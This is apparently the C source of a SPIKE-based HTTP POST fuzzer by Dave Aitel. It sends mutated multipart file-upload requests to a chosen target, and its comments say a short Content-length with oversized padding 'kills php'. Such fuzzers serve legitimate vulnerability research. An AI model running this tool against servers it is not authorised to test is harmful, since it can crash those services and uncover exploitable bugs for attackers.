/* Start webfuzzprelude.c */
/*short post kills php*/
#define SHORT_POST
/*#define USEBRACKETS*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h> /*for memset*/
#include <sys/types.h>
#include <sys/socket.h>
#include <signal.h>

#include "spike.h"
#include "hdebug.h"
#include "tcpstuff.h"
void
usage()
{
  fprintf(stderr,"Usage: ./post_fuzz target port file\r\n");
  fprintf(stderr,"Example: ./post_fuzz localhost 80 /bob2.php\n");
  fprintf(stderr,"This should find the php bug, and similar bugs\n");
  fprintf(stderr,"Happy bug hunting!\n");
  fprintf(stderr,"contact Dave Aitel if you find anything cool. :> \n");

  exit(-1);
}

int
main (int argc, char ** argv)
{
  char * target;
  char buffer[1500000];
  int port;
  char * file;
  char * boundry;
  int first;

  struct spike * our_spike;
  unsigned long retval;
  int notfin;

  if (argc!=4)
    {
      usage();
    }

  target=argv[1];
  printf("Target is %s\r\n",argv[1]);

  port=atoi(argv[2]);

  file = argv[3];


  our_spike=new_spike();
  s_init_fuzzing();

  /*sheesh.*/
  signal(SIGPIPE,SIG_IGN);

  if (our_spike==NULL)
    {
      fprintf(stderr,"Malloc failed trying to allocate a spike.\r\n");
      exit(-1); 
    }
  boundry=strdup("------------010804080503070405060306");

  setspike(our_spike);
  
  /*during s_variable push, if fuzzstring is == currentfuzzstring
    then set didlastfuzzstring. If fuzzvariable is == current
    variable, set didlastfuzzvariable*/


  
  /*zeroth fuzz variable is first variable*/
  s_resetfuzzvariable();
  while (!s_didlastvariable())
    {
      s_resetfuzzstring();
      /*zeroth fuzz string is no change*/
      
      while(!s_didlastfuzzstring())
	{
	  spike_clear();

	  /*reset this*/
	  /*controls when we put an ampersand or not*/
	  s_setfirstvariable();	  

          s_string("POST");
	  s_string(" ");
	  s_string(file);
	  s_string(" HTTP/1.1\r\n");
	  s_string("Referer: http://localhost/");
	  s_string("bob");
	  s_string("\r\n");
	  s_string("Connection: ");
	  s_string("Keep-Alive");
	  s_string("\r\n");
	  s_string("Cookie: ");
  	  s_string("VARIABLE");
	  s_string("=");
	  s_string("DAVEAITEL");
          s_string("; path=/");
	  s_string("\r\n");
	  s_string("User-Agent: ");
	  s_string("Mozilla/4.76 [en] (X11; U; Linux 2.4.2-2 i686)");
	  s_string("\r\n");
	  s_string("Variable");
	  s_string(": ");
	  s_string("result");
	  s_string("\r\n");
	  s_string("Host: ");
	  s_string("localhost");
	  s_string("\r\n");
	  s_string("Content-length: ");

/*to get PHP to die you need to set this to the middle of your post...*/
#ifdef SHORT_POST
	  s_string("25000");
#else
/*otherwise use this*/
	  s_blocksize_string("post",7);
#endif
	  s_string("\r\n");
	  s_string("Accept: ");
	  s_string("image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png");
	  s_string("\r\n");
	  s_string("Accept-Encoding: ");
	  s_string("gzip");
	  s_string("\r\n");
	  s_string("Accept-Language: ");
	  s_string("en");
	  s_string("\r\n");
          s_string("Content-Type: ");
          s_string("multipart/form-data; ");
          s_string("boundary");
	  s_string("=");
 	  s_string(boundry);
	  s_string("\r\n");
	  s_string("Accept-Charset: ");
	  s_string("iso-8859-1,*,utf-8");
	  s_string("\r\n");
	  s_string("\r\n");
	  /*Done with Headers*/
	  s_string("\r\n");
	  s_block_start("post");

/*BLOCK START*/

	  s_string(boundry);
	  s_string("\n");
          s_string("Content-Disposition:");
	  s_string(" ");
	  s_string("form-data");
	  s_string("; ");
	  s_string("name");
	  s_string("=");
	  s_string("\"MAX_FILE_SIZE\"");
	  s_string(";\n\n");
          s_string("30000");
	  s_string_repeat("A",15000);
	  //s_string_variable("");
          s_string("\n");
	  s_string(boundry);
          s_string("\n");
  	  s_string("Content-Disposition:");
 	  s_string(" ");
 	  s_string("form-data");
	  s_string("; ");
	  s_string("name");
	  s_string("=");
          s_string("\"");
#ifdef USEBRACKETS
          s_string("["); /*probably should have an option to mess with this*/
#endif
	  s_string_variable("userfile");
#ifdef USEBRACKETS
          s_string("]"); /*and this*/
#endif
          s_string("\"; ");
          s_string("filename");
	  s_string("=\"");
	  s_string_variable("Quran.gif");
	  s_string("\";\n");
	  s_string("Content-Type: ");
	  s_string("image/gif");
	  s_string("; ");
	  s_string_variable("");
          s_string("\n");
          s_string("AB");
          s_string("\n");
          s_string(boundry);
	  s_string("\n");
          s_string("Content-Disposition: form-data; name=\"MAX_FILE_SIZEBOB\";");
	s_string("\n\n");

	  s_block_end("post");
/*END OF POST BLOCK*/
	  /* Start webfuzzpostlude.c */ 


	  if (spike_send_tcp(target,port)==0)
	    {
	      printf("Couldn't connect to host or send data!\r\n");
	      /*exit(-1);*/
	    }

	  /*see, the thing is that the spike is not guaranteed to be
            null terminated, so just a plain printf on the
            s_get_databuf() is ill-advised.*/
	  memset(buffer,0x00,sizeof(buffer));
	  if (s_get_size()>2500)
	    memcpy(buffer,s_get_databuf(),2500);
	  else
	    memcpy(buffer,s_get_databuf(),s_get_size());

	  /*here we print out our request*/
	  printf("Request:\n%.2500s\nEndRequest\n",buffer);

	  notfin=1;
	  retval=1;
	  first=1;
	  while(retval && notfin) 
	    {
	      memset(buffer,0x00,sizeof(buffer));
	      notfin=s_fd_wait();
	      if (!notfin)
                {
                 printf("Server didn't answer in time limit\n");
		break;
                }
	      retval=read(our_spike->fd,buffer,2500);
              if (first && (retval==-1 || retval==0) )
                {
		   printf("***Server closed connection!\n");
		   fprintf(stderr,"***Server closed connection!\n");
                }
              first=0;
	      if (retval)
		{
		    printf("**%.2500s**\n",buffer);
		  /*this is where you filter responses out that you don't want to bother seeing.*/
#if 0
		  /*don't print out 404 errors*/
		  if (!strstr(buffer,"404") && !strstr(buffer,"400 Bad Request") && !strstr(buffer,"check that it is entered correctly"))
 		break;
#endif
		  /*here we speed things up by no continuing to read past this dumb error message*/
		  /*do this same thing for any request that continues to slow you down and is non-interesting*/
                  if (strstr(buffer,"<TITLE>404"))
                    break;
                  if (strstr(buffer,"<TITLE>401"))
		    break;
		  if (strstr(buffer,"401 Access denied"))
		    break;
		  if (strstr(buffer,"Public: OPTIONS"))
		    break;
		  if (strstr(buffer,"Please do not alter this file"))
		    break;
		  if (strstr(buffer,"GIF89a"))
		    break;
		  if (strstr(buffer,"This object may be found <a HREF=\"localstart.asp\""))
	break;

		if (strstr(buffer,"home page, and then look for links to the information you want"))
		break;
		 if(strstr(buffer,"Location: localstart.asp"))
		break;
 		 if (strstr(buffer,"This is the default page that appears on new AOLserver installations"))
		break;
		if (strstr(buffer,"This page intentionally left blank."))
		break;
               }
	    }/*end while read loop*/
               printf("End response\n");
	  s_incrementfuzzstring();
	  spike_close_tcp();
	  /*Use this for testing against netcat*/
	  /*
	    sleep(1);
	  */
	}/*end for each fuzz string*/
      s_incrementfuzzvariable();
    }/*end for each variable*/
  printf("Done.\n");
  return 0;
} /*end program*/

/* End webfuzzpostlude.c */ 

